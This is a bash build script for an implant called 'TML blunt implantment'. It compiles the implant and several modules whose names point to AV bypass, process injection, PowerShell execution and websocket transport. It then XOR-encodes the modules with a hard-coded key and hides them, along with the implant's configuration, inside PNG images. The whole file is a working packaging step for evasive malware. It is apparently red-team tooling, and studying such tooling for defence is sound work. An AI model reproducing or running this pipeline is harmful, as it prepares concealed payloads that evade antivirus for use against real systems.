#!/bin/bash
# Configuration
xorkey=hitb
outputimagedir=delivery
templateimage=template.png

# XOR encode module
echo -n "Utilities are compiling..."
mcs /out:$outputimagedir/xorenc.exe xorenc.cs
mcs /out:$outputimagedir/imgtest.exe imgtest.cs
echo "done!"

# Compile the implant
echo -n "TML blunt implantment is compiling..."
mcs /out:$outputimagedir/tbi.exe tbi.cs
echo "done!"

# Compile the modules
echo -n "Modules are compiling..."
mcs /reference:$outputimagedir/tbi.exe /target:library /out:$outputimagedir/websocketmdl.dll websocketmdl.cs
mcs /reference:$outputimagedir/tbi.exe /target:library /out:$outputimagedir/assemblymdl.dll assemblymdl.cs
mcs /reference:$outputimagedir/tbi.exe /target:library /out:$outputimagedir/samplemdl.dll samplemdl.cs
mcs /reference:$outputimagedir/tbi.exe /target:library /out:$outputimagedir/avbpmdl.dll avbpmdl.cs
mcs /reference:$outputimagedir/tbi.exe /target:library /out:$outputimagedir/injectormdl.dll injectormdl.cs
mcs /reference:$outputimagedir/tbi.exe /target:library /out:$outputimagedir/di-injectormdl.dll di-injectormdl.cs
mcs /reference:System.Management.Automation.dll,$outputimagedir/tbi.exe /target:library /out:$outputimagedir/powermdl.dll powermdl.cs
echo "done!"

# Inject the modules to images
echo "Modules are injecting to images:"
mono $outputimagedir/imgtest.exe generateimage $templateimage $outputimagedir/websocketmdl.dll $xorkey $outputimagedir/enccontent-ws.png
mono $outputimagedir/imgtest.exe generateimage $templateimage $outputimagedir/assemblymdl.dll $xorkey $outputimagedir/enccontent-as.png
mono $outputimagedir/imgtest.exe generateimage $templateimage $outputimagedir/samplemdl.dll $xorkey $outputimagedir/enccontent-sm.png
mono $outputimagedir/imgtest.exe generateimage $templateimage $outputimagedir/avbpmdl.dll $xorkey $outputimagedir/enccontent-av.png
mono $outputimagedir/imgtest.exe generateimage $templateimage $outputimagedir/injectormdl.dll $xorkey $outputimagedir/enccontent-in.png
mono $outputimagedir/imgtest.exe generateimage $templateimage $outputimagedir/di-injectormdl.dll $xorkey $outputimagedir/enccontent-din.png
mono $outputimagedir/imgtest.exe generateimage $templateimage $outputimagedir/powermdl.dll $xorkey $outputimagedir/enccontent-ps.png
echo "Done!"

# XOR the modules with a key
echo -n "Modules are XOR encoding for standalone usage..."
mono $outputimagedir/xorenc.exe $outputimagedir/websocketmdl.dll $outputimagedir/websocketmdl-xor.dll $xorkey
mono $outputimagedir/xorenc.exe $outputimagedir/assemblymdl.dll $outputimagedir/assemblymdl-xor.dll $xorkey
mono $outputimagedir/xorenc.exe $outputimagedir/avbpmdl.dll $outputimagedir/avbpmdl-xor.dll $xorkey
mono $outputimagedir/xorenc.exe $outputimagedir/samplemdl.dll $outputimagedir/samplemdl-xor.dll $xorkey
mono $outputimagedir/xorenc.exe $outputimagedir/injectormdl.dll $outputimagedir/injectormdl-xor.dll $xorkey
mono $outputimagedir/xorenc.exe $outputimagedir/di-injectormdl.dll $outputimagedir/di-injectormdl-xor.dll $xorkey
mono $outputimagedir/xorenc.exe $outputimagedir/powermdl.dll $outputimagedir/powermdl-xor.dll $xorkey
echo "done!"

# Config encoding with an image
echo "Configuration is injecting to the image and testing:"
mono $outputimagedir/imgtest.exe generateimage $templateimage config $xorkey $outputimagedir/conf.png
echo
echo "The XOR key is $xorkey"
echo "The output directory is $outputimagedir"
echo
